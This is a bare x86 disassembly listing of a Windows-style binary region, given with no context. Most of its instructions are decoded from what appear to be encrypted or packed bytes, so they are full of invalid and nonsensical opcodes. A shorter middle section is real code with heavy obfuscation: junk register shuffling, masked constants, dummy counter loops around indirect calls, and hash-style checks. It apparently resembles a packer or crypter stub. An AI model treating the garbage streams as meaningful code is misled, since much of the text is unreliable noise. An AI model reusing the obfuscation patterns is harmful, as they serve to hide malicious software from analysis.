  40ccea:	mov    BYTE PTR [edx],bh
  40ccec:	push   ecx
  40cced:	wbinvd 
  40ccef:	ror    BYTE PTR [ebx],1
  40ccf1:	cmp    esp,DWORD PTR [ecx]
  40ccf3:	(bad)  [ebp+0x42]
  40ccf7:	xor    al,BYTE PTR [esi-0x3e]
  40ccfa:	push   ds
  40ccfb:	es inc eax
  40ccfd:	sbb    al,0x8d
  40ccff:	mov    al,0xe5
  40cd01:	mov    eax,0x90802626
  40cd06:	mov    esp,0xa6326433
  40cd0b:	cli    
  40cd0c:	fs inc ebp
  40cd0e:	call   0xafbf2799
  40cd13:	cmp    edx,ebx
  40cd15:	stos   DWORD PTR es:[edi],eax
  40cd16:	(bad)  
  40cd17:	push   edi
  40cd18:	xchg   ebx,eax
  40cd19:	inc    ebx
  40cd1a:	lahf   
  40cd1b:	mov    al,0x51
  40cd1d:	test   DWORD PTR [ecx],edx
  40cd1f:	jo     0x40cd10
  40cd21:	scas   eax,DWORD PTR es:[edi]
  40cd22:	lods   eax,DWORD PTR ds:[esi]
  40cd23:	pushf  
  40cd24:	and    eax,0xaf5ee073
  40cd29:	xcrypt-ctr (bad)
  40cd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd2b:	ficom  DWORD PTR [edi]
  40cd2d:	dec    ebx
  40cd2e:	sti    
  40cd2f:	icebp  
  40cd30:	je     0x40cd14
  40cd32:	lods   eax,DWORD PTR ds:[esi]
  40cd33:	xor    ecx,DWORD PTR [ebx+0x28]
  40cd36:	pop    edi
  40cd37:	out    0x8f,eax
  40cd39:	clc    
  40cd3a:	popf   
  40cd3b:	rcr    BYTE PTR [edx-0x4c],0x6d
  40cd3f:	dec    edi
  40cd40:	ficom  WORD PTR [esi-0x37e2d53a]
  40cd46:	ins    DWORD PTR es:[edi],dx
  40cd47:	pop    esp
  40cd48:	cdq    
  40cd49:	dec    esi
  40cd4a:	call   0x5936fb27
  40cd4f:	aaa    
  40cd50:	jmp    0x40cdb3
  40cd52:	dec    esp
  40cd53:	dec    edx
  40cd54:	jp     0x40cd99
  40cd56:	cli    
  40cd57:	pop    ecx
  40cd58:	inc    edi
  40cd59:	sbb    eax,0x33eddbf0
  40cd5e:	fimul  DWORD PTR [edi-0x39f401c1]
  40cd64:	and    al,0xd7
  40cd66:	test   BYTE PTR [eax],ch
  40cd68:	shr    bh,cl
  40cd6a:	adc    al,0x68
  40cd6c:	ins    BYTE PTR es:[edi],dx
  40cd6d:	dec    edi
  40cd6e:	daa    
  40cd6f:	pop    es
  40cd70:	mov    BYTE PTR [esi+0x5f243c32],cl
  40cd76:	mov    ah,0x59
  40cd78:	shl    cl,cl
  40cd7a:	jp     0x40cd38
  40cd7c:	sub    esp,DWORD PTR [edx*1-0x77a25185]
  40cd83:	into   
  40cd84:	icebp  
  40cd85:	push   ebp
  40cd86:	sti    
  40cd87:	idiv   eax
  40cd89:	cmp    al,0xf6
  40cd8b:	sub    eax,0xc00de9c1
  40cd90:	out    dx,eax
  40cd91:	std    
  40cd92:	or     ebp,DWORD PTR [esi-0x5479a057]
  40cd98:	xor    al,0xab
  40cd9a:	jle    0x40cdf7
  40cd9c:	scas   eax,DWORD PTR es:[edi]
  40cd9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd9e:	and    DWORD PTR [edi],eax
  40cda0:	cmp    al,0x90
  40cda2:	call   0xecf2:0xaa1869fa
  40cda9:	call   0x1513:0xf6648d6a
  40cdb0:	sbb    ebp,DWORD PTR [ebx+0x1a8d0013]
  40cdb6:	jmp    0x593f:0x3d40f4af
  40cdbd:	inc    esp
  40cdbe:	stos   BYTE PTR es:[edi],al
  40cdbf:	xor    eax,0xac4c6079
  40cdc4:	arpl   WORD PTR [esi+0x492af8f7],ax
  40cdca:	fdiv   DWORD PTR [ebx+ebp*2]
  40cdcd:	aam    0x68
  40cdcf:	push   esi
  40cdd0:	jge    0x40cdf3
  40cdd2:	int3   
  40cdd3:	sub    eax,0xc62cbb70
  40cdd8:	pop    es
  40cdd9:	aad    0xfb
  40cddb:	repz ja 0x40cdde
  40cdde:	mov    ds:0xe5c2a8fa,eax
  40cde3:	mov    eax,ds:0x62fd17a0
  40cde8:	es jo  0x40cdcb
  40cdeb:	pop    es
  40cdec:	add    BYTE PTR [ebp+0x6],ah
  40cdef:	inc    eax
  40cdf0:	or     DWORD PTR [edi],edi
  40cdf2:	dec    ebp
  40cdf3:	outs   dx,BYTE PTR ds:[esi]
  40cdf4:	sub    esp,DWORD PTR [edi+0x42]
  40cdf7:	jne    0x40cd9c
  40cdf9:	(bad)  
  40cdfa:	sbb    cl,bl
  40cdfc:	pusha  
  40cdfd:	test   al,0xe
  40cdff:	repz xor al,0xce
  40ce02:	pop    edi
  40ce03:	mov    ecx,0xc376c8d6
  40ce08:	sub    BYTE PTR [ecx-0x7f809450],dl
  40ce0e:	xlat   BYTE PTR ds:[ebx]
  40ce0f:	jno    0x40ce0b
  40ce11:	mov    ch,0xee
  40ce13:	out    0x3,al
  40ce15:	call   0xfd592594
  40ce1a:	add    edx,DWORD PTR [ecx]
  40ce1c:	mov    bl,0x7d
  40ce1e:	and    al,0x7c
  40ce20:	test   al,0x43
  40ce22:	jge    0x40cda6
  40ce24:	pop    edx
  40ce25:	int    0x19
  40ce27:	fcmovu st,st(5)
  40ce29:	mov    bh,0x4f
  40ce2b:	cmc    
  40ce2c:	inc    ecx
  40ce2d:	ss jae 0x40ce59
  40ce30:	out    dx,eax
  40ce31:	nop
  40ce32:	test   al,0x29
  40ce34:	mov    DWORD PTR [ebx],eax
  40ce36:	jl     0x40cde0
  40ce38:	in     al,dx
  40ce39:	or     eax,0x409babef
  40ce3e:	fcmovnu st,st(7)
  40ce40:	sbb    BYTE PTR [edi-0x31],ah
  40ce43:	mov    ds:0x3bba643d,eax
  40ce48:	enter  0x840f,0x71
  40ce4c:	add    BYTE PTR [eax],al
  40ce4e:	add    BYTE PTR [ebx+0x458bec7d],cl
  40ce54:	or     BYTE PTR [ebx+0x448b1455],cl
  40ce5a:	add    BYTE PTR [ecx+edi*4],0x93
  40ce5e:	or     BYTE PTR [ecx+0x7],dl
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c66
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42386a
  40cf91:	push   0x423822
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a86
  40cff7:	mov    ebx,DWORD PTR ds:0x421aae
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c66
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cea
  40d0ed:	mov    esi,DWORD PTR ds:0x421ce2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ce2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	aam    0x80
  40d113:	scas   al,BYTE PTR es:[edi]
  40d114:	xor    eax,0x6262d1c2
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x27]
  40d11e:	xchg   edi,eax
  40d11f:	xchg   ebx,eax
  40d120:	in     eax,0x2
  40d122:	scas   al,BYTE PTR es:[edi]
  40d123:	jnp    0x40d0f1
  40d125:	arpl   WORD PTR [ebp-0x3bb58558],sp
  40d12b:	ficomp DWORD PTR [esp+ebp*2+0x2a]
  40d12f:	call   0xb906:0x5be7847f
  40d136:	cmp    edx,0xb94dc0b7
  40d13c:	(bad)  
  40d13e:	pusha  
  40d13f:	mov    ch,0x2a
  40d141:	fisubr DWORD PTR [eax]
  40d143:	enter  0xf525,0x4e
  40d147:	pushf  
  40d148:	push   edx
  40d149:	pop    eax
  40d14a:	js     0x40d13c
  40d14c:	cmp    eax,0x51bbefbf
  40d151:	xchg   ebp,eax
  40d152:	in     al,0xa9
  40d154:	sub    DWORD PTR [edx+ecx*4],edx
  40d157:	mov    bl,0xba
  40d159:	push   0xb2d80151
  40d15e:	mov    eax,0x77581773
  40d163:	push   cs
  40d164:	iret   
  40d165:	imul   edi,edx,0xa5d67099
  40d16b:	add    BYTE PTR [edi+0x5e],bh
  40d16e:	mov    al,0x25
  40d170:	dec    edi
  40d171:	retf   0xd194
  40d174:	inc    esp
  40d175:	js     0x40d120
  40d177:	add    BYTE PTR cs:[edx-0x2a591175],dl
  40d17e:	fcmovnbe st,st(4)
  40d180:	daa    
  40d181:	xor    al,0xe
  40d183:	jns    0x40d19f
  40d185:	punpckhdq mm7,QWORD PTR [ebp-0x4f152b13]
  40d18c:	xchg   ebx,eax
  40d18d:	sbb    eax,0xfe57e9e2
  40d192:	retf   0xa878
  40d195:	push   ss
  40d196:	sbb    ebp,DWORD PTR [ecx-0x75]
  40d199:	mov    eax,ds:0x7f53521a
  40d19e:	sub    eax,0x2c307310
  40d1a3:	sar    BYTE PTR [edx+0x12e2736e],cl
  40d1a9:	pop    ebp
  40d1aa:	xchg   esi,eax
  40d1ab:	mov    WORD PTR [ecx+0x60],ss
  40d1ae:	fs xchg edi,eax
  40d1b0:	sub    DWORD PTR [ebx-0x21],esi
  40d1b3:	bound  esp,QWORD PTR [ecx+0x34eacb7b]
  40d1b9:	mov    ecx,0x4555acf7
  40d1be:	mov    esp,0xd0bb16c2
  40d1c3:	inc    esi
  40d1c4:	push   ebx
  40d1c5:	(bad)  
  40d1c6:	mov    eax,ds:0xdfbfffba
  40d1cb:	and    al,0xf
  40d1cd:	mov    DWORD PTR [edx-0x66],edi
  40d1d0:	pop    esi
  40d1d1:	push   ds
  40d1d2:	sub    BYTE PTR [edx+0x5d],bl
  40d1d5:	in     al,dx
  40d1d6:	mov    dl,0xc5
  40d1d8:	xor    al,0x4
  40d1da:	or     al,0x4f
  40d1dc:	sub    eax,0xa9a08a02
  40d1e1:	leave  
  40d1e2:	inc    ebx
  40d1e3:	rcr    DWORD PTR [edi+0x29c767ea],0x9d
  40d1ea:	lods   eax,DWORD PTR ds:[esi]
  40d1eb:	adc    DWORD PTR [eax],esp
  40d1ed:	arpl   WORD PTR [ecx],si
  40d1ef:	and    dl,al
  40d1f1:	xor    al,BYTE PTR [ecx+esi*2+0x15]
  40d1f5:	mov    cs,WORD PTR [ebp-0x6c]
  40d1f8:	mov    ss:0x9a7d188e,eax
  40d1fe:	out    dx,eax
  40d1ff:	cs scas eax,DWORD PTR es:[edi]
  40d201:	dec    esi
  40d202:	into   
  40d203:	sbb    ecx,ebx
  40d205:	lods   eax,DWORD PTR ds:[esi]
  40d206:	jge    0x40d1c2
  40d208:	add    bh,BYTE PTR [eax-0x6872ff1e]
  40d20e:	neg    BYTE PTR [esi-0x6]
  40d211:	and    eax,DWORD PTR [eax+0x39ec0681]
  40d217:	pop    ecx
  40d218:	das    
  40d219:	lods   eax,DWORD PTR ds:[esi]
  40d21a:	push   ebx
  40d21b:	(bad)  ds:0x7192071c
  40d221:	scas   eax,DWORD PTR es:[edi]
  40d222:	push   ss
  40d223:	xchg   DWORD PTR [esi+ecx*2-0x4c],edx
  40d227:	das    
  40d228:	hlt    
  40d229:	(bad)  
  40d22a:	outs   dx,BYTE PTR ds:[esi]
  40d22b:	mov    bh,0xe9
  40d22d:	imul   ecx,DWORD PTR [esp],0x95faad00
  40d234:	mov    ecx,0x9555aeed
  40d239:	add    ebp,edx
  40d23b:	xor    eax,ebx
  40d23d:	fdiv   DWORD PTR [edi-0x6f]
  40d240:	jecxz  0x40d2b7
  40d242:	adc    eax,0x7646213d
  40d247:	cmp    al,0x12
  40d249:	repz cld 
  40d24b:	int    0xff
  40d24d:	xor    bl,BYTE PTR [ebp+0x22a0b748]
  40d253:	cmp    dl,BYTE PTR [ebx-0x26]
  40d256:	test   al,0x45
  40d258:	push   ecx
  40d259:	loopne 0x40d2bd
  40d25b:	sbb    eax,0x5f6281b
  40d260:	loope  0x40d283
  40d262:	push   0xffffff91
  40d264:	dec    esp
  40d265:	pop    ebp
  40d266:	mov    al,ds:0x5b9f7143
  40d26b:	and    al,0xba
  40d26d:	xchg   ecx,eax
  40d26e:	out    0xc1,al
  40d270:	xchg   BYTE PTR [edx-0x2ba429ef],al
  40d276:	xlat   BYTE PTR ds:[ebx]
  40d277:	or     ah,bl
  40d279:	imul   edx,DWORD PTR [ebp-0x6e],0x1e
  40d27d:	mov    bh,0x73
  40d27f:	push   edx
  40d280:	mov    ds:0xaf6fb0d3,eax
  40d285:	sbb    esi,DWORD PTR [ecx-0x568a6c63]
  40d28b:	outs   dx,BYTE PTR fs:[esi]
  40d28d:	push   0xffffff93
  40d28f:	pop    ss
  40d290:	inc    ecx
  40d291:	lods   al,BYTE PTR ds:[esi]
  40d292:	sbb    eax,0xe83d896a
  40d297:	dec    ecx
  40d298:	lahf   
  40d299:	xchg   ecx,eax
  40d29a:	dec    esi
  40d29b:	cmp    eax,0xa9fccf20
  40d2a0:	stos   DWORD PTR es:[edi],eax
  40d2a1:	out    dx,eax
  40d2a2:	shl    BYTE PTR [ecx+0x50],cl
  40d2a5:	out    0x1,eax
  40d2a7:	fadd   DWORD PTR [ecx-0x55]
  40d2aa:	inc    ebx
  40d2ab:	loope  0x40d23d
  40d2ad:	jg     0x40d299
  40d2af:	jno    0x40d2e5
  40d2b1:	and    DWORD PTR [edi-0x12d42dc],ebp
  40d2b7:	cdq    
  40d2b8:	sub    ebp,ecx
  40d2ba:	push   ss
  40d2bb:	push   0xe924b6fd
  40d2c0:	ja     0x40d28e
  40d2c2:	test   eax,0xf3b6efa1
  40d2c7:	mov    dl,0xb7
  40d2c9:	sbb    dh,0xa
  40d2cc:	(bad)  
  40d2cd:	js     0x40d2ad
  40d2cf:	lods   al,BYTE PTR ds:[esi]
  40d2d0:	and    esp,DWORD PTR [esp+ebx*8]
  40d2d3:	adc    eax,0x66b54d7e
  40d2d8:	xchg   ecx,eax
  40d2d9:	mov    al,0xa4
  40d2db:	sbb    BYTE PTR [ebp-0x57],al
  40d2de:	pop    ebp
  40d2df:	and    eax,0x3f3b786e
  40d2e4:	jge    0x40d320
  40d2e6:	pop    ecx
  40d2e7:	xchg   ecx,eax
  40d2e8:	mov    edi,DWORD PTR [ecx]
  40d2ea:	mov    ebx,0x287db710
  40d2ef:	or     dl,BYTE PTR [ebp-0x54]
  40d2f2:	jmp    DWORD PTR [esi-0x6cdf347a]
  40d2f8:	and    DWORD PTR [edx],esp
  40d2fa:	call   0x1235:0x4d17699b
  40d301:	out    0x78,al
  40d303:	ss dec ecx
  40d305:	pop    edi
  40d306:	popf   
  40d307:	xlat   BYTE PTR ds:[ebx]
  40d308:	mov    ecx,0xa02daa42
  40d30d:	mov    ebx,0x292e2c92
  40d312:	xchg   edx,eax
  40d313:	bound  edx,QWORD PTR [edi+0x3d365bd5]
  40d319:	sbb    DWORD PTR [ecx+0x5],ebp
  40d31c:	out    dx,al
  40d31d:	inc    esi
  40d31e:	cmp    eax,DWORD PTR [ebx]
  40d320:	adc    esp,ecx
  40d322:	xchg   edx,eax
  40d323:	mov    DWORD PTR [ecx],eax
  40d325:	cli    
  40d326:	mov    edx,0xc0c59691
  40d32b:	stos   DWORD PTR es:[edi],eax
  40d32c:	xchg   ebx,eax
  40d32d:	push   esp
  40d32e:	mov    ecx,0x8e89c80
  40d333:	cli    
  40d334:	inc    eax
  40d336:	push   ecx
  40d337:	std    
  40d338:	or     cl,BYTE PTR [edx+0x69]
  40d33b:	jbe    0x40d3b2
  40d33d:	jne    0x40d3ab
  40d33f:	mov    bl,0x83
  40d341:	fstp   DWORD PTR [ecx]
  40d343:	pop    ebx
  40d344:	dec    ecx
  40d345:	hlt    
  40d346:	xor    al,0x18
  40d348:	inc    eax
  40d349:	add    ebp,ebp
  40d34b:	retf   0x7dac
  40d34e:	mov    eax,gs:0x61ab8929
  40d354:	xor    dl,BYTE PTR [eax-0x21]
  40d357:	cmp    cl,BYTE PTR [ebp+0x52]
  40d35a:	sub    DWORD PTR [edx-0x5c],esi
  40d35d:	std    
  40d35e:	mov    fs,WORD PTR [esi+0x21]
  40d361:	call   0x8cd20558
  40d366:	retf   0x4d18
  40d369:	jmp    0x40d396
  40d36b:	mov    ebx,0x600df8ef
  40d370:	gs sub dl,bl
  40d373:	push   esp
  40d374:	push   ebx
  40d375:	das    
  40d376:	mov    esi,0xd51ae379
  40d37b:	and    eax,0x73d0b0f2
  40d380:	mov    ecx,0x73ca4bd0
  40d385:	outs   dx,DWORD PTR ds:[esi]
  40d386:	jg     0x40d3ce
  40d388:	in     al,0xea
  40d38a:	add    BYTE PTR [esp+ecx*8],al
  40d38d:	sbb    eax,0xb5be4f33
  40d392:	and    DWORD PTR [ebp+ebx*4+0x3c6000d3],edx
  40d399:	sbb    al,0xf
  40d39b:	xchg   BYTE PTR [esi-0x10bb2b86],bh
  40d3a1:	cmp    DWORD PTR [ecx],edx
  40d3a3:	push   esi
  40d3a4:	mov    dl,0xc7
  40d3a6:	call   0xfcf9c390
  40d3ab:	cwde   
  40d3ac:	dec    ebp
  40d3ad:	xor    al,0x6d
  40d3af:	push   ss
  40d3b0:	sub    DWORD PTR [ebx],esp
  40d3b2:	mov    dh,0x11
  40d3b4:	ds repnz adc eax,0x3e55ab3b
  40d3bb:	ins    DWORD PTR es:[edi],dx
  40d3bc:	pop    edi
  40d3bd:	repnz push esi
  40d3bf:	inc    ebp
  40d3c0:	push   esp
  40d3c1:	add    al,BYTE PTR [esi-0xc]
  40d3c4:	nop
  40d3c5:	ret    
  40d3c6:	inc    DWORD PTR [eax+0x28]
  40d3c9:	adc    BYTE PTR [ebx-0x217ce67a],dh
  40d3cf:	out    dx,eax
  40d3d0:	and    ecx,edx
  40d3d2:	pop    ebx
  40d3d3:	lock (bad) 
  40d3d5:	cld    
  40d3d6:	adc    al,dh
  40d3d8:	pop    edx
  40d3d9:	(bad)  
  40d3da:	push   esp
  40d3db:	jle    0x40d407
  40d3dd:	ret    
  40d3de:	fcom   DWORD PTR [edi+0xd19dafb]
  40d3e4:	neg    BYTE PTR [edi+esi*2-0x611e9091]
  40d3eb:	lock push ebp
  40d3ed:	cli    
  40d3ee:	push   0xffffffc4
  40d3f0:	mov    al,0x94
  40d3f2:	dec    eax
  40d3f3:	or     DWORD PTR [edx+0x776a8aaa],eax
  40d3f9:	pop    esi
  40d3fa:	xchg   esi,eax
  40d3fb:	not    ah
  40d3fd:	outs   dx,BYTE PTR ds:[esi]
  40d3fe:	jecxz  0x40d414
  40d400:	je     0xfdef211e
  40d406:	mov    ah,0x0
  40d408:	xor    esi,ebp
  40d40a:	mov    edi,0x28b16a35
  40d40f:	mov    esi,0x8b0cf25b
  40d414:	xor    edi,esp
  40d416:	enter  0xbf78,0x55
  40d41a:	mov    edx,0x57bbeb85
  40d41f:	fld    QWORD PTR [edi+0x5a311457]
  40d425:	out    0x9e,eax
  40d427:	pop    esp
  40d428:	mov    edi,eax
  40d42a:	lea    esp,[ecx+0x72]
  40d42d:	retf   
  40d42e:	iret   
  40d42f:	into   
  40d430:	cmp    cl,ch
  40d432:	scas   al,BYTE PTR es:[edi]
  40d433:	hlt    
  40d434:	push   ecx
  40d435:	and    al,0x77
  40d437:	nop
  40d438:	mov    ebp,0x8ef54d1d
  40d43d:	jnp    0x40d3c9
  40d43f:	ficom  WORD PTR [ebx]
  40d441:	xchg   BYTE PTR [edx],al
  40d443:	repnz sub esi,DWORD PTR [esi-0x15e80418]
  40d44a:	mov    eax,ds:0x860b9117
  40d44f:	cdq    
  40d450:	mov    ds:0x8ff7af96,eax
  40d455:	add    ebx,DWORD PTR [edi+eiz*2-0x2d]
  40d459:	daa    
  40d45a:	mov    dl,0x7c
  40d45c:	enter  0x42f3,0x4
  40d460:	jl     0x40d414
  40d462:	adc    DWORD PTR [ebp-0x4cffda27],esp
  40d468:	(bad)  
  40d469:	mov    edx,0xc9e846ec
  40d46e:	xchg   ecx,eax
  40d46f:	fstp   st(2)
  40d471:	sbb    ebp,edi
  40d473:	xor    BYTE PTR [ebx+0x1f2bb61c],al
  40d479:	loop   0x40d474
  40d47b:	xchg   DWORD PTR [ecx],edx
  40d47d:	mov    BYTE PTR [eax],al
  40d47f:	call   0xc69f491b
  40d484:	sub    bh,BYTE PTR [edi-0x7ea9a42d]
  40d48a:	loop   0x40d4e5
  40d48c:	pop    ecx
  40d48d:	mov    ecx,0x4d3c7c5b
  40d492:	fwait
  40d493:	mov    BYTE PTR [eax],ch
  40d495:	scas   al,BYTE PTR es:[edi]
  40d496:	dec    ecx
  40d497:	push   0x29
  40d499:	aas    
  40d49a:	lods   eax,DWORD PTR ds:[esi]
  40d49b:	pop    ecx
  40d49c:	cmc    
  40d49d:	pushf  
  40d49e:	std    
  40d49f:	retf   0x92d2
  40d4a2:	push   eax
  40d4a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a4:	leave  
  40d4a5:	xor    dh,BYTE PTR [edx-0x78]
  40d4a8:	lods   eax,DWORD PTR ds:[esi]
  40d4a9:	inc    ebp
  40d4aa:	scas   al,BYTE PTR es:[edi]
  40d4ab:	aas    
  40d4ac:	cs pop esp
  40d4ae:	push   edx
  40d4af:	popa   
  40d4b0:	push   esp
  40d4b1:	inc    esp
  40d4b2:	jmp    0xd1050b13
  40d4b7:	outs   dx,BYTE PTR ds:[esi]
  40d4b8:	ins    BYTE PTR es:[edi],dx
  40d4b9:	dec    esi
  40d4ba:	in     eax,0x83
  40d4bc:	mov    edi,0xac3976f5
  40d4c1:	loop   0x40d4b5
  40d4c3:	das    
  40d4c4:	jmp    0x33e8:0x6d53c55e
  40d4cb:	cld    
  40d4cc:	mov    al,ds:0xff131fce
  40d4d1:	(bad)  
  40d4d3:	ins    DWORD PTR es:[edi],dx
  40d4d4:	lods   al,BYTE PTR ds:[esi]
  40d4d5:	push   edi
  40d4d6:	in     eax,dx
  40d4d7:	(bad)  
  40d4d8:	int    0xf4
  40d4da:	idiv   DWORD PTR [edx+0x5ec93c7d]
  40d4e0:	push   ebx
  40d4e1:	and    cl,BYTE PTR [ebx]
  40d4e3:	add    esp,DWORD PTR [ecx-0x65]
  40d4e6:	jmp    0xcdf6:0x711886a4
  40d4ed:	test   al,0xb9
  40d4ef:	inc    ebx
  40d4f0:	jnp    0x40d508
  40d4f2:	cmp    bl,0x99
  40d4f5:	ret    
